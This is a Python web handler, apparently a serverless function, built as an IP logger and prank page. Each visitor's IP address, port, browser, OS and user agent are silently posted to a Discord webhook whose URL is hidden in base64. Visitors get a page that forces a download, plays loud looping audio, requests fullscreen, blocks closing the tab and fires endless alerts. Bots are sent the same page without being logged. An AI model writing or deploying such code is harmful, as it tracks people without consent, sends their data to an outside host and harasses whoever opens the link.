from http.server import BaseHTTPRequestHandler
import requests
import httpagentparser
import base64

# Encrypted (Base64) webhook and image URL
WEBHOOK_URL = base64.b64decode("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ5MDE0NjAyOTUwMzM4NTczNC9kSkhEVmRUaDExUUhGd19pa053LXdwRkczTkI4QU4wMlhsLXJHTVRuXzhlakp4dnlUV1l5eE9oZFozUDNVMXROUV9CVg==").decode('utf-8')
FAKE_IMAGE_URL = base64.b64decode("aHR0cHM6Ly9tZWRpYS50ZW5vci5jb20vWFBpV3M1aWw4b3dBQUFBTS90dW5nLXR1bmd0dW5nLXR1bmd0dW5ndHVuZy1zYWh1ci10dW5ndHVuZ3R1bmdzYWh1ci10dW5ndHVuZ3NhaHVyLmdpZg==").decode('utf-8')

# Simple & stable annoying page
ANNOY_HTML = """
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>TUNG TUNG</title>
  <style>
    body{margin:0;background:#000;color:#f00;font-family:monospace;overflow:hidden;height:100vh;}
    #overlay{position:fixed;inset:0;background:rgba(255,0,0,0.95);display:flex;align-items:center;justify-content:center;flex-direction:column;z-index:9999;}
    h1{font-size:6em;animation:blink 0.3s infinite;}
    @keyframes blink{0%,100%{opacity:1} 50%{opacity:0.1}}
  </style>
</head>
<body>
  <div id="overlay">
    <h1>TUNG TUNG VIRUS</h1>
    <p>LOUD MODE ON 🔥</p>
  </div>

  <audio id="song" autoplay loop>
    <source src="https://www.myinstants.com/media/sounds/tung-tung-sahur.mp3" type="audio/mpeg">
  </audio>

  <script>
    const audio = document.getElementById("song");
    audio.volume = 1.0;
    function playAudio() { audio.play().catch(() => setTimeout(playAudio, 300)); }
    playAudio();

    const link = document.createElement('a');
    link.href = "{0}";
    link.download = "tung-tung-virus.gif";
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);

    document.documentElement.requestFullscreen?.().catch(() => {{}});
    window.onbeforeunload = () => "TUNG TUNG says NO!";
    setInterval(() => alert("TUNG TUNG VIRUS: CLOSE FAILED!"), 800);
  </script>
</body>
</html>
""".format(FAKE_IMAGE_URL)

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        try:
            user_agent = self.headers.get('User-Agent', '')

            if any(bot in user_agent.lower() for bot in ['discordbot', 'discord', 'crawler', 'bot', 'spider']):
                html = ANNOY_HTML.encode('utf-8')
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.send_header('Content-Length', len(html))
                self.end_headers()
                self.wfile.write(html)
                return

            ip = self.headers.get('X-Forwarded-For', self.client_address[0])
            port = self.headers.get('X-Forwarded-Port', 'Unknown')
            parsed = httpagentparser.detect(user_agent)

            log = f"""**NEW CLICK!**
IP: `{ip}`
Port: `{port}`
Browser: {parsed.get('browser', {}).get('name', 'Unknown')}
OS: {parsed.get('os', {}).get('name', 'Unknown')}
UA: `{user_agent}`
**Tung Tung loud song activated!**"""

            requests.post(WEBHOOK_URL, json={"content": log})

            html = ANNOY_HTML.encode('utf-8')
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.send_header('Content-Length', len(html))
            self.end_headers()
            self.wfile.write(html)

        except Exception as e:
            self.send_response(500)
            self.end_headers()
            self.wfile.write(f"Error: {str(e)}".encode())

    def do_HEAD(self):
        self.do_GET()
